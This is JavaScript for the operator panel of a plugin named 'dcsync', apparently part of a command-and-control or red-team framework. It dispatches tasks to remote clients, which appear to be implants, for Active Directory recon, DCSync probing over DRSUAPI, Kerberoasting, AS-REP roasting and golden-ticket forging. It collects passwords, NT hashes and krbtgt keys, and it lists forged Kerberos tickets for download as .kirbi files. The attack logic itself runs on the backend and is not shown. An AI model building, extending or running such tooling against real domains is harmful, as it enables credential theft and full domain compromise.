const PLUGIN_ID = "dcsync";

let currentClientId = "";

const $ = (id) => document.getElementById(id);

async function rpc(method, params = {}) {
  const res = await fetch(`/api/plugins/${PLUGIN_ID}/rpc`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ method, params }),
  });
  const body = await res.json().catch(() => ({}));
  if (!body.ok) throw new Error(body.error || `rpc ${method} failed: ${res.status}`);
  return body.result;
}

async function sendEvent(event, payload = {}) {
  if (!currentClientId) {
    log("no client id set", "err");
    return;
  }
  await fetch(`/api/clients/${currentClientId}/plugins/${PLUGIN_ID}/event`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ event, payload }),
  });
}

function setBadge(state) {
  const b = $("statusBadge");
  b.className = "badge " + (state || "idle");
  b.textContent = state || "idle";
}

function log(text, kind = "") {
  const el = $("log");
  const line = document.createElement("div");
  line.className = "line" + (kind ? " " + kind : "");
  const ts = document.createElement("span");
  ts.className = "ts";
  ts.textContent = new Date().toLocaleTimeString();
  line.appendChild(ts);
  line.appendChild(document.createTextNode(text));
  el.appendChild(line);
  while (el.children.length > 200) el.removeChild(el.firstChild);
  el.scrollTop = el.scrollHeight;
}

function collectSettings() {
  return {
    domain: $("domain").value.trim(),
    dc: $("dc").value.trim(),
    user: $("user").value.trim(),
    password: $("password").value,
    ntHash: $("ntHash").value.trim(),
    targetUser: $("targetUser").value.trim(),
    krbtgtKey: $("krbtgtKey").value.trim(),
    domainSid: $("domainSid").value.trim(),
  };
}

function renderRecon(info) {
  const el = $("reconInfo");
  if (!info) {
    el.className = "info empty";
    el.textContent = "not probed yet";
    return;
  }
  el.className = "info";
  el.innerHTML = "";
  const rows = [
    ["domain", info.domain],
    ["dcs", (info.dcs || []).join(", ")],
    ["dc", info.dc],
    ["rpc", (info.rpc || []).map((r) => r.port).join(", ")],
  ];
  rows.forEach(([k, v]) => {
    if (!v) return;
    const d = document.createElement("div");
    d.innerHTML = `<span class="k">${k}:</span> <span class="v"></span>`;
    d.querySelector(".v").textContent = v;
    el.appendChild(d);
  });
  if (info.domain && !$("domain").value) $("domain").value = info.domain;
  if (info.dcs && info.dcs.length && !$("dc").value) $("dc").value = info.dcs[0];
}

function renderProbe(p) {
  const el = $("probeInfo");
  el.className = "info";
  el.innerHTML = "";
  const rows = [
    ["dc", p.dc],
    ["rpc ports open", (p.rpcPorts || []).join(", ")],
    ["drsuapi", p.drsuapi ? "exposed" : "not exposed"],
    ["bind", p.bind],
    ["target", p.target],
    ["reason", p.reason],
  ];
  rows.forEach(([k, v]) => {
    if (!v) return;
    const d = document.createElement("div");
    d.innerHTML = `<span class="k">${k}:</span> <span class="${k === "drsuapi" ? (p.drsuapi ? "ok" : "bad") : "v"}"></span>`;
    d.querySelector("span:last-child").textContent = v;
    el.appendChild(d);
  });
}

function renderTickets(list) {
  $("tCount").textContent = list.length;
  const body = $("ticketBody");
  body.innerHTML = "";
  if (!list.length) {
    $("ticketEmpty").style.display = "block";
    return;
  }
  $("ticketEmpty").style.display = "none";
  list.forEach((t) => {
    const tr = document.createElement("tr");

    const kind = document.createElement("td");
    const k = document.createElement("span");
    k.className = "kind-tag " + t.kind;
    k.textContent = t.kind;
    kind.appendChild(k);

    const user = document.createElement("td");
    user.className = "mono";
    user.textContent = t.user || "-";

    const dom = document.createElement("td");
    dom.textContent = t.domain || "-";

    const et = document.createElement("td");
    et.textContent = t.etype || "-";

    const size = document.createElement("td");
    size.textContent = t.size ? `${t.size}B` : "-";

    const act = document.createElement("td");
    const btn = document.createElement("button");
    btn.className = "btn";
    btn.textContent = "download";
    btn.style.fontSize = "11px";
    btn.style.padding = "4px 8px";
    btn.onclick = () => downloadTicket(t.id, t.user);
    act.appendChild(btn);

    tr.appendChild(kind);
    tr.appendChild(user);
    tr.appendChild(dom);
    tr.appendChild(et);
    tr.appendChild(size);
    tr.appendChild(act);
    body.appendChild(tr);
  });
}

async function downloadTicket(id, user) {
  try {
    const t = await rpc("get_ticket", { id });
    const bin = atob(t.data || "");
    const bytes = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    const blob = new Blob([bytes], { type: "application/octet-stream" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `${user || "ticket"}.kirbi`;
    a.click();
    URL.revokeObjectURL(url);
  } catch (e) {
    log("download failed: " + e.message, "err");
  }
}

function renderRequests(list) {
  $("rCount").textContent = list.length;
  const body = $("reqBody");
  body.innerHTML = "";
  if (!list.length) {
    $("reqEmpty").style.display = "block";
    return;
  }
  $("reqEmpty").style.display = "none";
  list.forEach((r) => {
    const tr = document.createElement("tr");

    const kind = document.createElement("td");
    const k = document.createElement("span");
    k.className = "kind-tag " + (r.kind || "");
    k.textContent = r.kind || "-";
    kind.appendChild(k);

    const user = document.createElement("td");
    user.className = "mono";
    user.textContent = r.user || "-";

    const dom = document.createElement("td");
    dom.textContent = r.domain || "-";

    const size = document.createElement("td");
    size.textContent = r.size ? `${r.size}B` : "-";

    const act = document.createElement("td");
    const btn = document.createElement("button");
    btn.className = "btn";
    btn.textContent = "copy b64";
    btn.style.fontSize = "11px";
    btn.style.padding = "4px 8px";
    btn.onclick = async () => {
      try {
        const req = await rpc("get_request", { id: r.id });
        await navigator.clipboard.writeText(req.data || "");
        log("request copied", "ok");
      } catch (e) {
        log("copy failed: " + e.message, "err");
      }
    };
    act.appendChild(btn);

    tr.appendChild(kind);
    tr.appendChild(user);
    tr.appendChild(dom);
    tr.appendChild(size);
    tr.appendChild(act);
    body.appendChild(tr);
  });
}

function handleStream(data) {
  if (!data) return;
  const evt = data.event;
  const p = data.payload ?? data;
  if (p && p.clientId && p.clientId !== currentClientId) return;

  switch (evt) {
    case "status":
      setBadge(p.state);
      if (p.detail) log(p.detail);
      break;
    case "recon":
      renderRecon(p);
      log(`recon: ${p.domain} — ${(p.dcs || []).length} DC(s)`, "ok");
      break;
    case "dcsync_probe":
      renderProbe(p);
      if (p.drsuapi) {
        log(`DRSUAPI exposed on ${p.dc} (${p.bind})`, "ok");
      } else {
        log(`DRSUAPI not exposed: ${p.reason}`, "err");
      }
      break;
    case "golden_ticket":
      log(`golden ticket forged: ${p.user}@${p.domain} (${p.size}B)`, "ok");
      loadTickets();
      break;
    case "asrep_request":
      log(`AS-REQ built for ${p.user} (${p.size}B)`, "ok");
      loadRequests();
      break;
    case "krb_recon":
      log(`KDC reachable at ${p.dc}:88`, "ok");
      break;
    case "error":
      log(p.message || "error", "err");
      break;
    default:
      break;
  }
}

function connectStream() {
  const es = new EventSource(`/api/plugins/${PLUGIN_ID}/stream`);
  ["status", "recon", "dcsync_probe", "golden_ticket", "asrep_request", "krb_recon", "error", "pong"].forEach((ch) => {
    es.addEventListener(ch, (ev) => {
      let data;
      try { data = JSON.parse(ev.data); } catch { data = null; }
      if (data != null) handleStream({ event: ch, payload: data });
    });
  });
  es.onerror = () => {
    es.close();
    setTimeout(connectStream, 3000);
  };
}

async function loadRecon() {
  if (!currentClientId) return;
  try { renderRecon(await rpc("get_recon", { clientId: currentClientId })); } catch (e) {}
}

async function loadTickets() {
  if (!currentClientId) return;
  try { renderTickets(await rpc("list_tickets", { clientId: currentClientId })); } catch (e) {}
}

async function loadRequests() {
  if (!currentClientId) return;
  try { renderRequests(await rpc("list_requests", { clientId: currentClientId })); } catch (e) {}
}

async function loadConfig() {
  if (!currentClientId) return;
  try {
    const cfg = await rpc("get_config", { clientId: currentClientId });
    if (cfg.domain) $("domain").value = cfg.domain;
    if (cfg.dc) $("dc").value = cfg.dc;
    if (cfg.user) $("user").value = cfg.user;
    if (cfg.targetUser) $("targetUser").value = cfg.targetUser;
    if (cfg.domainSid) $("domainSid").value = cfg.domainSid;
  } catch (e) {}
}

async function refreshClients() {
  try {
    const clients = await rpc("list_clients");
    const dl = $("clientsList");
    dl.innerHTML = "";
    clients.forEach((c) => {
      const o = document.createElement("option");
      o.value = c.clientId;
      dl.appendChild(o);
    });
    $("clientCount").textContent =
      clients.length ? `${clients.length} client(s) seen` : "no clients seen yet";
    if (clients.length && !currentClientId) {
      currentClientId = clients[0].clientId;
      $("clientId").value = currentClientId;
      loadConfig(); loadRecon(); loadTickets(); loadRequests();
    }
  } catch (e) {}
}

async function save() {
  try { await rpc("save_config", { clientId: currentClientId, config: collectSettings() }); } catch (e) {}
}

function bind() {
  $("clientId").addEventListener("change", (e) => {
    currentClientId = e.target.value.trim();
    loadConfig(); loadRecon(); loadTickets(); loadRequests();
  });

  $("refreshClients").addEventListener("click", refreshClients);

  $("recon").addEventListener("click", async () => {
    await save();
    setBadge("working");
    sendEvent("recon", collectSettings());
  });

  $("dcsync").addEventListener("click", async () => {
    await save();
    setBadge("working");
    log("probing DRSUAPI — this needs Replicating Directory Changes rights");
    sendEvent("dcsync", collectSettings());
  });

  $("kerberoast").addEventListener("click", async () => {
    await save();
    setBadge("working");
    sendEvent("kerberoast", collectSettings());
  });

  $("asrep").addEventListener("click", async () => {
    await save();
    setBadge("working");
    sendEvent("asrep", collectSettings());
  });

  $("forge").addEventListener("click", async () => {
    await save();
    setBadge("working");
    sendEvent("forge", collectSettings());
  });
}

bind();
connectStream();
loadConfig(); loadRecon(); loadTickets(); loadRequests();
refreshClients();
